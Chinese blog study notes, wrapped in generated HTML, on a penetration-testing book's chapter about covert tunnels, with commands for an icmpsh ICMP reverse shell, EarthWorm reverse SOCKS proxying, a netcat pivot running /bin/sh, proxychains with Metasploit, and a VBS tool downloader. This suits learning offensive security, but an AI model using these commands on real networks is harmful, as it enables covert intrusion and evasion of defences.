@@ -1,0 +1,820 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="MirRoR4s">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="读到这一章其实对内网渗透已经有一个基本的了解了，我也系统地学到了很多知识。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全攻防-渗透测试实战指南第三章">
+<meta property="og:url" content="https://mirror4s.github.io/2023/02/07/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E7%AC%AC%E4%B8%89%E7%AB%A0/index.html">
+<meta property="og:site_name" content="学习记录">
+<meta property="og:description" content="读到这一章其实对内网渗透已经有一个基本的了解了，我也系统地学到了很多知识。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-02-07T02:01:31.000Z">
+<meta property="article:modified_time" content="2023-02-07T06:05:27.898Z">
+<meta property="article:author" content="MirRoR4s">
+<meta property="article:tag" content="内网安全攻防">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>内网安全攻防-渗透测试实战指南第三章 - 学习记录</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mirror4s.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网安全攻防-渗透测试实战指南第三章"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-07 10:01" pubdate>
+          2023年2月7日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网安全攻防-渗透测试实战指南第三章</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年2月7日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <!--toc-->
+<p>读到这一章其实对内网渗透已经有一个基本的了解了，我也系统地学到了很多知识。</p>
+<span id="more"></span>
+
+<h2 id="隐藏隧道通信技术"><a href="#隐藏隧道通信技术" class="headerlink" title="隐藏隧道通信技术"></a>隐藏隧道通信技术</h2><h3 id="31-隐藏通信隧道基础知识"><a href="#3-1-隐藏通信隧道基础知识" class="headerlink" title="3.1 隐藏通信隧道基础知识"></a>3.1 隐藏通信隧道基础知识</h3><h3 id="32-网络层隧道技术"><a href="#3-2-网络层隧道技术" class="headerlink" title="3.2 网络层隧道技术"></a>3.2 网络层隧道技术</h3><h4 id="322-icmp隧道"><a href="#3-2-2-ICMP隧道" class="headerlink" title="3.2.2 ICMP隧道"></a>3.2.2 ICMP隧道</h4><p>常见的 icmp 隧道工具有 icmpsh、PingTunnel、icmptunnel、powshell icmp等</p>
+<h5 id="1-icmpsh"><a href="#1-icmpsh" class="headerlink" title="1. icmpsh"></a><strong>1. icmpsh</strong></h5><blockquote>
+<p>下载地址：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh.git">https://github.com/inquisb/icmpsh.git</a></p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/redwand/article/details/113791092">(14条消息) 【内网流量操控技术六】icmp隧道之icmpsh_redwand的博客-CSDN博客</a></p>
+</blockquote>
+<p><strong>使用场景：</strong></p>
+<p>该工具只适用于靶机是 windows环境的</p>
+<p>icmp隧道实战中多用于服务器未开启任何端口时，但双方能够通过icmp协议通讯，即能够ping通对方</p>
+<p><strong>vps 服务端-ubuntu 22.04：</strong></p>
+<ol>
+<li>下载 icmpsh</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/bdamele/icmpsh.git<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>安装 python 的 impacket 类库，以便对TCP、UDP等协议进行访问</li>
+</ol>
+<p><strong>python3：</strong></p>
+<p>这里提示安装python3-impacket，但icmpsh软件是基于python2开发的，因此必须要安装python-impacket，从github上下载impacket并安装。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecureAuthCorp/im</span>packet.git<br>cd impacket <br>python setup.py install<br></code></pre></td></tr></table></figure>
+
+
+
+<ol start="3">
+<li>关闭本地系统的 ICMP 应答</li>
+</ol>
+<p>因为 icmpsh 工具要代替系统本身的ping命令的应答程序，所以需要输入如下命令来关闭本地系统的 ICMP 应答（如果要恢复系统应答，则设置为0），否则 Shell 的运行会不稳定（表现为一直刷屏，无法进行交互输入）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w net.ipv4.icmp_echo_ignore_all=1<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>运行 run.sh</li>
+</ol>
+<p>运行 run.sh 脚本，然后输入目标的 ip地址即可</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">./<span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>客户端：</strong></p>
+<ol>
+<li>将 icmpsh 上传至客户端</li>
+</ol>
+<p>这一步可以通过 linux 下自带的 curl，或者可以通过 ftp</p>
+<p>如果用curl的话，可以先在vps上开启一个http服务器</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
+
+<p>然后在客户端用如下命令下载http服务器上的 icmpsh</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -o icmpsh http:<span class="hljs-regexp">//i</span>p:port/icmp.sh<br></code></pre></td></tr></table></figure>
+
+<p>注意你运行命令的时候所在目录下要有 icmp.sh</p>
+<ol start="2">
+<li>运行 icmpsh</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">icmpsh</span>.exe -t vpsIP -d <span class="hljs-number">500</span> -b <span class="hljs-number">30</span> -s <span class="hljs-number">128</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="2-pingtunnel"><a href="#2-PingTunnel" class="headerlink" title="2. PingTunnel"></a>2. PingTunnel</h5><p>icmpsh 虽好，但是不适用于靶机是linux的场景，这时候就需要使用 PingTunnel啦</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/282244.html">icmp隧道搭建（pingtunnel的使用） - FreeBuf网络安全行业门户</a></p>
+<blockquote>
+<p>工具过于出名以致于造成了不良影响，所以创始人删除了该工具</p>
+</blockquote>
+<h3 id="33-传输层隧道技术"><a href="#3-3-传输层隧道技术" class="headerlink" title="3.3 传输层隧道技术"></a>3.3 传输层隧道技术</h3><h4 id="331-lcx端口转发"><a href="#3-3-1-lcx端口转发" class="headerlink" title="3.3.1 lcx端口转发"></a>3.3.1 lcx端口转发</h4><h4 id="332-netcat"><a href="#3-3-2-netcat" class="headerlink" title="3.3.2 netcat"></a>3.3.2 netcat</h4><p>神器！</p>
+<h5 id="5-内网代理"><a href="#5-内网代理" class="headerlink" title="5. 内网代理"></a>5. 内网代理</h5><p>使用场景：</p>
+<p>vps可以访问linux1靶机，但无法访问linux-2靶机，同时linux-1靶机可以访问linux-2靶机。目标是获取到linux-2靶机的shell，这时候可以通过nc的内网代理来实现。</p>
+<p><strong>思路：</strong></p>
+<p>vps 监听 3333端口</p>
+<p>linux-2 监听 3333端口并在连接之后运行 &#x2F;bin&#x2F;sh 命令</p>
+<p>linux-1 在连接 linux2 之后再连接 vps </p>
+<h3 id="35-socks-代理"><a href="#3-5-SOCKS-代理" class="headerlink" title="3.5 SOCKS 代理"></a>3.5 SOCKS 代理</h3><h4 id="351-常用-socks-代理工具"><a href="#3-5-1-常用-SOCKS-代理工具" class="headerlink" title="3.5.1 常用 SOCKS 代理工具"></a>3.5.1 常用 SOCKS 代理工具</h4><h4 id="352-socks-代理技术在网络环境中的应用"><a href="#3-5-2-SOCKS-代理技术在网络环境中的应用" class="headerlink" title="3.5.2 SOCKS 代理技术在网络环境中的应用"></a>3.5.2 SOCKS 代理技术在网络环境中的应用</h4><p><strong>1. EarthWorm</strong></p>
+<p>不得不说这真的是一个神器，虽然可能很多杀软都把该软件加到检测规则中去了。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/MirRoR4s/ew">idlefire&#x2F;ew: 内网穿透(跨平台) (github.com)</a></p>
+<p>使用场景：</p>
+<p>vps可以访问linux-1，linux-1可以访问内网的linux-2，但是vps不能访问linux-2。现在的目标是通过socks代理访问到linux-2</p>
+<p>如果只能访问linux-1特定端口，可以试着反弹 socks5 代理服务器</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">a)</span> <span class="hljs-string">./ew</span> <span class="hljs-string">-s</span> <span class="hljs-string">rcsocks</span> <span class="hljs-string">-l</span> <span class="hljs-number">1080</span> <span class="hljs-string">-e</span> <span class="hljs-number">8888</span><br>                           <span class="hljs-string">//</span> <span class="hljs-string">在</span> <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-string">的公网主机添加转接隧道，将</span> <span class="hljs-number">1080</span> <span class="hljs-string">收到的代理请求转交给反连</span> <span class="hljs-number">8888</span> <span class="hljs-string">端口的主机</span><br>               <span class="hljs-string">b)</span> <span class="hljs-string">./ew</span> <span class="hljs-string">-s</span> <span class="hljs-string">rssocks</span> <span class="hljs-string">-d</span> <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-string">-e</span> <span class="hljs-number">8888</span>          <br>                           <span class="hljs-string">//</span> <span class="hljs-string">将目标网络的可控边界主机反向连接公网主机</span><br><br>               <span class="hljs-string">c)</span> <span class="hljs-string">HackTools</span> <span class="hljs-string">可通过访问</span> <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-string">:1080</span> <span class="hljs-string">端口使用</span> <span class="hljs-string">rssocks</span> <span class="hljs-string">主机提供的</span> <span class="hljs-string">socks5</span> <span class="hljs-string">代理服务</span><br></code></pre></td></tr></table></figure>
+
+<p>搭建好了之后可以在本地的kali配置走vps的1080端口代理</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>proxychain4.conf<br></code></pre></td></tr></table></figure>
+
+<p>注释掉 dynamic_chain</p>
+<p>然后添加vps的代理配置信息 </p>
+<p>最后上线无敌的 msf！</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>代理的流量交换真是有点多~</p>
+</blockquote>
+<p><strong>2. nishang</strong></p>
+<p>这玩意我还没用过，有时候会钻研，听说也是一个神奇。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">samratashok&#x2F;nishang: Nishang - Offensive PowerShell for red team, penetration testing and offensive security. (github.com)</a></p>
+<p>安装好像也很简单，git 下来按照官方的指示直接运行下面的命令就好</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">nishang</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">nishang</span><span class="hljs-operator">.</span><span class="hljs-variable">psm1</span><br></code></pre></td></tr></table></figure>
+
+<p>具体的解释可以看看这篇文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27723026">PowerShell攻防进阶篇：nishang工具用法详解 - 知乎 (zhihu.com)</a></p>
+<h3 id="37"><a href="#3-7" class="headerlink" title="3.7"></a>3.7</h3><h4 id="371-利用-ftp-协议"><a href="#3-7-1-利用-ftp-协议" class="headerlink" title="3.7.1 利用 ftp 协议"></a>3.7.1 利用 ftp 协议</h4><p>在vps上搭建ftp服务器</p>
+<p><a target="_blank" rel="noopener" href="https://www.myfreax.com/how-to-setup-ftp-server-with-vsftpd-on-ubuntu-20-04/">https://www.myfreax.com/how-to-setup-ftp-server-with-vsftpd-on-ubuntu-20-04/</a></p>
+<h4 id="372-利用-vbs上传"><a href="#3-7-2-利用-VBS上传" class="headerlink" title="3.7.2 利用 VBS上传"></a>3.7.2 利用 VBS上传</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> Post = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;MSxml2.XMLHTTP&quot;</span>)<br><span class="hljs-keyword">Set</span> Shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)<br>Post.open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.1.1:9001/nbtscan.exe&quot;</span>,<span class="hljs-number">0</span><br>Post.send()<br><span class="hljs-keyword">Set</span> aGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)<br>aGet.Mode = <span class="hljs-number">3</span><br>aGet.Type = <span class="hljs-number">1</span><br>aGet.open()<br>aGet.Write(Post.responseBody)<br>aGet.SaveToFile <span class="hljs-string">&quot;C:\test\nbtscan.exe&quot;</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">#内网安全攻防</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网安全攻防-渗透测试实战指南第三章</div>
+      <div>https://mirror4s.github.io/2023/02/07/内网安全攻防-渗透测试实战指南第三章/index.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>MirRoR4s</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/07/PowerShell%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html" title="PowerShell与渗透测试">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PowerShell与渗透测试</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/06/DiceCTF-2023/index.html" title="DiceCTF-2023">
+                        <span class="hidden-mobile">DiceCTF-2023</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
